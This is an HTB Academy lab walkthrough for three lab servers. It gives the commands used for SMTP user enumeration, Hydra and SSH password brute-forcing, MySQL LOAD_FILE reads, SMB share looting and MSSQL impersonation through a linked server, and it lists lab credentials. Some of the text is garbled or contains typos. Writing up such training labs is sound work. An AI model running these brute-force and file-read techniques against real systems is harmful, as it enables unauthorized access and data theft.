# HTB Academy - Attacking Common Services - Complete Walkthrough

## Overview
This writeup covers the complete exploitation path for three interconnected servers in the **Attacking Common Services - Hard** module on HTB Academy. The goal was to enumerate services, find credentials, gain access, and escalate privileges to read the flag on the Administrator's desktop.

---

## Server 1: `WIN-EASY`

### Nmap Scan

```bash
nmap -p- -T4 [IP1]
```

**Open Ports:**
- 21/tcp - FTP (Core FTP Server 2.0)
- 25/tcp - SMTP (hMailServer)
- 80/tcp - HTTP (Apache 2.4.53 / PHP 7.4.29)
- 443/tcp - HTTPS (Self-signed SSL)
- 587/tcp - SMTP (hMailServer)
- 3306/tcp - MySQL (MariaDB 10.4.24)
- 3389/tcp - RDP (Windows Server 2019)

---

### Step 1: SMTP User Enumeration
SmTP was vulnerable to user enumeration using the `RCPT TO` method.

```bash
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t [IP1]
```

**Found user:** `fiona@inlanefreight.htb`

---

### Step 2: Brute-Force SMTP Password
Used Hydra to brute-force the password for Fiona.

```bash
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://[IP1]
```

**Credentials Found:**
```
fiona@inlanefreight.htb:987654321
```

---

### Step 3: MySQL Access
Connected to MySQL using the discovered credentials. Note the `--skip-ssl` flag due to TLS requirement.

```bash
mysql -h [IP2] -u fiona -p987654321
```

---

### Step 4: Checking File Read Permissions

```sql
SHOW VARIABLES LIKE "secure_file_priv";
```

**Result:** Empty value → file read/write allowed.

---

### Step 5: Reading the Flag

```sql
SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
```
---

## Server 2: `LINUX-MEDIUM`

### Nmap Scan

```bash
nmap -p- -T4 [IP2]
```

*Open Ports:**
- 22/tcp - SSH (OpenSSH 8.2p1 Ubuntu)
-53/tcp - DS (ISC BIND 9.16.1)
- 110/tcp - POP3 (Dovecot)
- 995/tcp - POP3S (Dovecot)
- 2121/tcp - FTP (ProFTPD - InlaneFTP)
- 30021/tcp - FTA (ProFTPD / ProFTPD_Internal FTP - **Anonymous allowed!**)

---

### Step 1: Anonymous FTP Access

```bash
ftp [IP2] 30021
```

**Login:** `anonymous` 
**Password:** (empty)

---

### Step 2: Enumerating FTP Files

```bash
ls -la
cd simon
ls -la
get mynotes.txt
```

**`mynotes.txt` contents:**
```
234987123948729384293
+23358093845098
ThatsMyBigDog
Rock!ngMay
Puuuuuh7823328
8Ns8j1b!23hs4921smHzwn
237oHs71ohls18H127!!9skaP
238u1xjn1923nZGSb261Bs81
```

---

### Step 3: SSH Brute-Force with Found Passwords

```bash
for user in fiona simon root admin; do
    for pass in $(cat mynotes.txt); do
        sshpass -p "$pass" ssh -o ConnectTimeout=2 $user@[IP2] "whoami" 2>/dev/null && echo "SUCCESS: $user:$pass"
    done
done
```

**Credentials Found:**
```
simon:8Ns8j1b!23hs4921smHzwn
```

---

### Step 4: SSH Login

```bash
ssh simon
```

---

### Step 5: Reading the Flag

```bash
ls
cat flag.txt
```
---

## Server 3: `WIN-HARD`

### Nmap Scan

```bash
nmap -p- -T4 [IP3]
```

*Open Ports:**
- 135/tcp - msrpc (Windows RPC)
- 445/tcp - SMB (Microsoft-DS)
- 1433/tcp - MSSQL 
Microsoft SQL Server 2019)
- 3389/tcp - RDP 
indows Server 2019)

---

### Step 1: SMB Enumeration

```bash
smbclient -L //[IP3] -N
```

**Found Shares:** 
- `ADMIN$`
- `Home` ← **Target**
- `IPC$`

---

### Step 2: Accessing SMB Share

```bash
smbclient //[IP3]/Home -U fiona -p '48Ns72!bns74@S84NNNSl'
```

*Found Directories:*
- `HR`
- `IT` (containing Fiona, John, Simon folders)
- `OPS`
- `Projects`

---

### Step 3: Downloading Files

```bash
cd IT/Fiona
get creds.txt

cd ../John
get information.txt
get notes.txt
get secrets.txt

cd ../Simon
get random.txt
```

**`creds.txt` (Fiona):** 
```
Windows Creds

kAkd03S@@!#
48Ns72!bns74@S84NNNSl
SecurePassword!
Password123!
SecureLocationforPasswordsd123!!
```

**secrets.txt` (John):**
```
Password Lists:

1234567
(DK02ka-dsaldS
Inlanefreight2022
Inlanefreight2022!
TestingDB123
```

**random.txt` (Simon):** 
```
Credentials

(k20ASD10934kadA
KDIlalsa9020$
JT9ads02lasSA@
Kaksd032klasdA#
LKads9kasd0-@
```

**information.txt` (John):**
```
To do:
- Keep testing with the database.
- Create a local linked server.
- Simulate Impersonation.
```

---

### Step 4: RDL Login as Fiona

```bash
xfreerdp /v:[IP3] /u:fiona /p:'48Ns72!bns74@S84NNNSl' +cert-ignore
```

---

### Step 5: SQL Server Enumeration
From the RDP session, opened `sqlcmd`:

```cmd
sqlcmd -S localhost -E
```

**Check users:**

```sql
SELECT name, type_desc FROM sys.sql_logins;
```

**Result:**
```
sa           SQL_LOGIN
john        SQL_LOGIN
simon        SQL_LOGIN
```

---

### Step 6: Impersonate `john`

```sql
EXECUTE AS LOGIN = 'john';
GO
SELECT SYSTEM_USER;
GO
```

**Result:** `john`

---

### Step 7: Read Flag via Linked Server

```sql
EXECUTE ('select * from OPENROWSET BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents) AT [local.test.linked.srv];
GO
```
---

## Summary of Credentials

| Server | User | Password |
|--------|--------|------------------------|
| 1 (WIN-EASY) | fiona@inlanefreight.htb | 987654321 |
| 2 (LINUX-MEDIUM) | simon | 8Ns8j1b!23hs4921smHzwn |
| 3 (WIN-HARD) | fiona | 48Ns72!bns74@S84NNNSl |

---

## Key Concepts Learned

1. *SMTP User Enumeration* using `RCPT TO`
2. *Brute-forcing* credentials with Hydra
3. *MySQL `LOAD_FILE()` for file read
4. *Anonymous FTP * access and password harvesting
5. *SMB* enumeration and file extraction
Y. *RDP* access with discovered credentials
7. *SQL Server Impersonation* (`EXECUTE AS`)
8. *Linked Servers* for privilege escalation
9. *`Openrowset(bulk ...)` for file read without `xp_cmdshell`

---

## Tools Used

- Nmap
- smtp-user-enum
- Hydra
- MySQL CLI
- FTP
- smbclient
- xfreerdp
- sqlcmd
- sshpass

---
